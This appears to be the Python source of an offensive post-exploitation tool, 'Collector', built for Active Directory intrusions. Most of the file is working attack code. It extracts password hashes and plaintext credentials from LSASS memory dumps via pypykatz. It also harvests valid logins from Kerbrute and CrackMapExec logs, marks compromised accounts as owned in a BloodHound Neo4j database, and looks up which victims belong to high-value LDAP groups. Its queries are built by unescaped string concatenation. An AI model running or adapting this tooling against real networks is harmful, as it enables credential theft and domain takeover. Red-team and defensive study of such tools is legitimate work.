#!/usr/bin/env python3
import os
import sys
import argparse
import re
from collections import OrderedDict
import yaml
import json
from utilities import escape_ldap
from ldap_connector import LDAP3Connector
from ldap_connector import ImpacketLDAPConnector
import colorama
from colorama import Fore, Style
from os import path
import glob
import neo4j
import logging
from time import time, sleep

#Steal from pypykatz


from pypykatz import logger as pypylogger
from pypykatz.pypykatz import pypykatz
from pypykatz.commons.common import UniversalEncoder
from pypykatz.lsadecryptor.packages.msv.decryptor import LogonSession
from pypykatz.commons.common import KatzSystemInfo
from minidump.minidumpfile import MinidumpFile

from io import StringIO
from copy import copy
from logging import Formatter






#Stolen from https://stackoverflow.com/questions/384076/how-can-i-color-python-logging-output
MAPPING = {
    'DEBUG'   : 32, # green
    'INFO'    : 36, # cyan
    'WARNING' : 33, # yellow
    'ERROR'   : 31, # red
    'CRITICAL': 41, # white on red bg
}

PREFIX = '\033['
SUFFIX = '\033[0m'

class ColoredFormatter(Formatter):

    def __init__(self, patern):
        Formatter.__init__(self, patern)

    def format(self, record):
        colored_record = copy(record)
        levelname = colored_record.levelname
        seq = MAPPING.get(levelname, 37) # default white
        colored_levelname = ('{0}{1}m{2}{3}').format(PREFIX, seq, levelname, SUFFIX)

        colored_record.levelname = colored_levelname

        colored_record.msg = ('{0}{1}m{2}{3}').format(PREFIX, seq, colored_record.getMessage(), SUFFIX)

        return Formatter.format(self, colored_record)



class StringBuilder:
    _file_str = None

    def __init__(self):
        self._file_str = StringIO()

    def Add(self, str):
        self._file_str.write(str + "\n")

    def __str__(self):
        return self._file_str.getvalue()


##Stolen from https://github.com/trustedsec/CrackHound/blob/8f6274f1142c619716649e76a309b37a839cb46c/crackhound.py#L83
def update_database(
    compromised_users, url, username, password):
    try:
       
        try:
            db_conn = neo4j.GraphDatabase.driver(
                url, auth=(username, password), encrypted=False
            )
        except Exception:
            mainlog.error("Couldn't connect to Neo4j database.")
        else:
            mainlog.info("Neo4j Connection success!")

        markedCount = 0
        for user in compromised_users:
            try:
                with db_conn.session() as session:
                    if '$' in user['username']:
                        tx = session.run(
                            'match (u:Computer) where u.name STARTS WITH "{0}" set u.owned=True return u.name'.format(
                                user["username"].upper().replace('$','.')
                            )
                        )
                       
                        if tx.single()[0] is not None:
                             markedCount += 1 

                    else:               
                        tx = session.run(
                            'match (u:User) where u.name STARTS WITH "{0}@" set u.owned=True return u.name'.format(
                                user["username"].upper()
                            )
                        )

                        if tx.single()[0] is not None:
                            markedCount += 1 

                    if(args.verbose):
                        mainlog.debug("{0} successfully marked as owned!".format(user['username']))             

                     

            except Exception as e:
                if(args.verbose):
                    mainlog.error(f'Error marking {user["username"]} as owned => {e}')
                    
                continue
                session.close()

        mainlog.debug(f"Successfully marked {markedCount} bloodhound objects as owned!") 
    except Exception as e:
        mainlog.error(f"An error occured {e}")



def isKebruteLog(inputData):
    # Check if it contains: Using KDC(s): and/or 'Done! Tested'
    result = re.search(r"Using KDC\(s\)((.|\n)*)Done! Tested.{0,40}logins.{0,40}seconds",inputData)
    if result == None:
        return False
    return True

def isCmeRawLog(logData):
    #Remove some colors
    regex = re.compile(r"\x1b\[[0-9;]*m")
    inputData = regex.sub("", logData)
    

    #Search for CME "pwned"  
    result = re.search(r"[a-zA-Z0-9\-\.]{1,15}\\[a-zA-Z][a-zA-Z0-9\-\.]{0,61}[a-zA-Z]:.{1,127} \(Pwn3d!\)(\n|\r|$)",inputData)
    if result != None:
        return True 

    #Search for NTHash creds
    result = re.search(r"[a-zA-Z0-9\-\.]{1,15}\\[a-zA-Z][a-zA-Z0-9\-\.]{0,61}[a-zA-Z]:[a-f0-9]{32}",inputData)
    if result != None:
        return True
    
    #Search for plaintext creds
    result = re.search(r"[a-zA-Z0-9\-\.]{1,15}\\[a-zA-Z][a-zA-Z0-9\-\.]{0,61}[a-zA-Z]:.{1,127}(\n|\r|$)",inputData)
    if result != None:
        return True  

 

#This attempts to read a config
def get_config(configPath):
    try:
        with open('config.yaml') as f:
            config = yaml.load(f, Loader=yaml.FullLoader)
            mainlog.info("Config found and parsed!")
            return config
    except:
        mainlog.error("Failed to read config!")

def parseFile(filePath, yamlConfig):
    compromised_users = []
    lsassDump = False
    #Get the config
    #yamlConfig = get_config('')
    import magic    

    if 'Mini DuMP crash report' in magic.from_file(filePath):
        inputDataRaw= ''
        mainlog.info("Parsing LSASS dump")
        results = {}
        lsassOutputBuilder = StringBuilder()
        minidump = MinidumpFile.parse(filePath)
        reader = minidump.get_reader().get_buffered_reader(segment_chunk_size=10*1024)
        sysinfo = KatzSystemInfo.from_minidump(minidump)
        mimi = pypykatz(reader, sysinfo)
        mimi.start(['all'])
        results[filePath] = mimi
        lsassDump = True
        lsassOutputBuilder.Add(':'.join(LogonSession.grep_header))
        for result in results:
            for luid in results[result].logon_sessions:
                for row in results[result].logon_sessions[luid].to_grep_rows():
                    if hasattr(args, 'directory') and args.directory is not None:
                        row = [result] + row
                    lsassOutputBuilder.Add(':'.join(row))
            for cred in results[result].orphaned_creds:
                t = cred.to_dict()
                if t['credtype'] != 'dpapi':
                    if t['password'] is not None:
                        x =  [str(t['credtype']), str(t['domainname']), str(t['username']), '', '', '', '', '', str(t['password'])]
                        if hasattr(args, 'directory') and args.directory is not None:
                            x = [result] + x
                        lsassOutputBuilder.Add(':'.join(x))
                else:
                    t = cred.to_dict()
                    x = [str(t['credtype']), '', '', '', '', '', str(t['masterkey']), str(t['sha1_masterkey']), str(t['key_guid']), '']
                    if hasattr(args, 'directory') and args.directory is not None:
                        x = [result] + x
                    lsassOutputBuilder.Add(':'.join(x))
            for pkg, err in results[result].errors:
                err_str = str(err)
                #err_str = base64.b64encode(err_str.encode()).decode()
                x =  [pkg+'_exception_please_report', '', '', '', '', '', '', '', '', err_str]
                if hasattr(args, 'directory') and args.directory is not None:
                    x = [result] + x
                lsassOutputBuilder.Add(':'.join(x) + '\r\n')
            rawCreds = lsassOutputBuilder
            validCreds = re.findall(r"msv:[a-zA-Z0-9\-\.]{1,15}.*[a-f0-9]{32}.*[a-f0-9]{32}",str(rawCreds))
            
            for validLogin in validCreds:
               
                if validLogin.split(':')[2] not in [d['username'] for d in compromised_users]:

                    user_dict = {}
                    user_dict["username"] = validLogin.split(':')[2]
                    user_dict["domain"] = validLogin.split(':')[1]
                    user_dict["password"] = validLogin.split(':')[3].rstrip()
                   
                    compromised_users.append(user_dict)
    else:
        try:
            inputFile = open(filePath,"r+")
            inputDataRaw = inputFile.read()

            #Try to determn what kinda of logs this is
            if isKebruteLog(inputDataRaw) and not lsassDump:
                mainlog.info("Kerbrute log identified!")
                #Remove some colors
                regex = re.compile(r"\x1b\[[0-9;]*m")
                inputData = regex.sub("", inputDataRaw)
                #Let's pull out all the valid creds
                validCreds = re.findall(r"\[\+\] VALID LOGIN:.{1,20}@[a-zA-Z0-9\-\.]{0,15}:.{1,127}",inputData)
                for validLogin in validCreds:
                    if validLogin[:-1].split(":")[1].split('@')[0].lstrip() not in [d['username'] for d in compromised_users]:
                        user_dict = {}
                        user_dict["username"] = validLogin[:-1].split(":")[1].split('@')[0].lstrip()
                        user_dict["domain"] =validLogin[:-1].split(":")[1].split('@')[1].lstrip().upper()
                        user_dict["password"] = validLogin[:-1].split(":")[2].lstrip().rstrip()
                    # mainlog.debug(f'Account compromised: {validLogin[:-1].split(":")[1].lstrip()}')
                        compromised_users.append(user_dict)

            if isCmeRawLog(inputDataRaw) and not lsassDump:
                mainlog.info("Raw CME logs identified!")
                #Remove some colors
                regex = re.compile(r"\x1b\[[0-9;]*m")
                inputData = regex.sub("", inputDataRaw)
                ##Find all valid creds with NTHashes
                ntHashCredsRegex = r"[a-zA-Z0-9\-\.]{1,15}\\[a-zA-Z][a-zA-Z0-9\-\.]{0,61}[a-zA-Z]:[a-f0-9]{32}"
                validCredsNtHashes = re.findall(ntHashCredsRegex, inputData)
                ##Find all the domain names
                plaintextCredsRegex = r'(?!.*:[a-f0-9]{32}|.*\(Pwn3d!\))[a-zA-Z0-9\-\.]{1,15}\\[a-zA-Z][a-zA-Z0-9\-\.]{0,61}[a-zA-Z]:.{1,127}'
                validCredsPlaintext = re.findall(plaintextCredsRegex, inputData)
                allValidCreds = validCredsNtHashes + validCredsPlaintext
                #print(allValidCreds)
                for validLogin in allValidCreds:
                
                    if validLogin.split(':')[0].split('\\')[1].rstrip() not in [d['username'] for d in compromised_users]:
                        user_dict = {}
                        user_dict["username"] = validLogin.split(':')[0].split('\\')[1].rstrip()
                        user_dict["domain"] = validLogin.split('\\')[0].rstrip()
                        user_dict["password"] = validLogin.split(':')[1].rstrip()
                        compromised_users.append(user_dict)
        except Exception as ex:
            mainlog.warning(f'Failed to read file: {ex}')
    return compromised_users


def cmdline_args():

    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
     
    p.add_argument("-i", "--inputData", help="Input file(s) or data", nargs='+')
    p.add_argument("--cme", action="store_true",help="fetch data from CrackMapExec logs")

    p.add_argument("--ldap", action="store_true",help="Query LDAP for compromised users group membership")

    p.add_argument("--blood", action="store_true",help="Marked owned accounts as owned in Bloodhound (Neo4j)")

    p.add_argument("--watch",help="Continually watch the data provided for changes (default every 10 seconds)", nargs='?', const=10, type=int)

    p.add_argument("-v","--verbose", action="store_true",help="Show verbose output")

    return(p.parse_args())

# Stolen from https://www.geeksforgeeks.org/python-find-most-frequent-element-in-a-list/
# Program to find most frequent
# element in a list
def most_frequent(List):
    return max(set(List), key = List.count)


pypylogger.setLevel(100)

# Create top level logger
mainlog = logging.getLogger("collector")

# Add console handler using our custom ColoredFormatter
ch = logging.StreamHandler()

ch.setLevel(logging.DEBUG)

cf = ColoredFormatter("[%(levelname)s]  %(message)s")
ch.setFormatter(cf)

mainlog.addHandler(ch)

# Set log level
mainlog.setLevel(logging.DEBUG)
mainlog.propagate = False

if __name__ == '__main__':
    
    ascii = """
    ,.--'`````'--.,
   (\'-.,_____,.-'/)
    \\-.,_____,.-//|
    ;\\         // |
    | \\  ___  //  |
    |  '-[___]-'  |
    |             |
    |             |
    |             |
    `'-.,_____,.-''
    """

    if sys.version_info<(3,5,0):
        mainlog.error("You need python 3.5 or later to run this script\n")
        sys.exit(1)
        
    try:
        args = cmdline_args()
        #print(args)
        print(ascii)
        mainlog.info("Collector 0.1 by ~Flangvik ")

        compromised_users = []
        lsassDump = False
        #Get the config
        yamlConfig = get_config('')

        while True:
            #Should we parse CME?
            if args.cme:
                #Check if the cme logs dir is there
                if path.exists(os.path.expanduser('~') + "/.cme/logs"):
                    mainlog.info("Parsing CME log files")

                    #Parse all secrets
                    for file in glob.glob(os.path.expanduser('~') + "/.cme/logs/*.secrets"):
                        inputFile = open(file,"r+")
                        inputDataRaw = inputFile.read()

                        #Decent regex
                        validCreds = re.findall(r'(?!.*:aes|.*:plain_password_hex:|.*des-cbc-md5:)[a-zA-Z0-9\-\.]{0,15}\\.*:.*\n',inputDataRaw)

                        #Uniq them
                        validUniq = list(set(validCreds))

                        #Parse them into the global dict
                        for letter in validUniq:
                            user_dict = {}

                            #print(letter)
                            user_dict["domain"] = letter.split('\\')[0].upper()

                            user_dict["username"] = letter.split('\\')[1].split(":")[0]

                            user_dict["password"] = letter.split('\\')[1].split(":")[1].lstrip().rstrip()

                            compromised_users.append(user_dict)

                else:
                    mainlog.error("Could not find CrackMapExec logs directory!")

            if args.inputData:
                for inputPath in args.inputData:      
                    ##If the path is a directory
                    if os.path.isdir(inputPath):
                        mainlog.debug(f"Reading files from {inputPath}")
                        for file in glob.glob(inputPath + "/*.*"):
                            mainlog.debug(f"Reading {file}")
                            compromised_users += parseFile(file,yamlConfig)
                    else:
                        compromised_users += parseFile(inputPath,yamlConfig)

            #Stolen from https://stackoverflow.com/questions/11092511/list-of-unique-dictionaries
            uniq_compromised_users = list({v['username']:v for v in compromised_users}.values())
            for user_dict in uniq_compromised_users:

                if(args.verbose):
                    mainlog.debug(f'Account compromised: {user_dict["domain"]}\{user_dict["username"]}:{user_dict["password"]}')

            mainlog.debug(f'{len(uniq_compromised_users)} accounts compromised')

            if args.blood:

                update_database(
                    uniq_compromised_users,
                    yamlConfig['neo4j_url'],
                    yamlConfig['neo4j_username'],
                    yamlConfig['neo4j_password'],
                )

            #Stolen from https://github.com/shellster/LDAPPER
            if args.ldap:
                mainlog.info("Querying LDAP for high priv users")

                Engine = None
                Engine = ImpacketLDAPConnector

                with Engine(yamlConfig['ldap_server'], 3, yamlConfig['ldap_domain'], yamlConfig['ldap_username'], yamlConfig['ldap_password'],'DC=legitcorp,DC=com', 10, 2, 0) as engine:
                    for user in compromised_users:
                        try:
                            searchQuery = '(&(objectclass=user)(|(CN=' + user['username'] + ')(sAMAccountName=' + user['username'] + ')))'
                            if '$' in user['username']:
                                searchQuery = '(&(objectclass=computer)(|(CN=' + user['username'] + ')(sAMAccountName=' + user['username'] + ')))'

                            searchFilter = ['cn', 'description', 'mail', 'memberOf', 'sAMAccountName']  
                            records_found = False

                            for i, record in enumerate(engine.search(searchQuery, searchFilter)):
                                records_found = True
                                for group in record['memberof']:
                                    groupName = group.split('=')[1].split(',')[0]
                                    if groupName is not None:
                                        if groupName in yamlConfig['high_value_groups']:
                                            mainlog.debug(f"User {user['username']} is a member of high value group {groupName}")

                                            mainlog.debug(f"Username {user['username']} Password: {user['password']}")

                            if records_found == False:
                                mainlog.warning(f"Could not find data for user {user['username']}")


                        except Exception as ex:
                            mainlog.error(f'Error: {ex}')
            if args.watch:
                compromised_users = []
                sleep(args.watch)
            else:
                sys.exit(0)
   
    except Exception as ex:
        mainlog.error(f'Error: {ex}')
        sys.exit(1)

    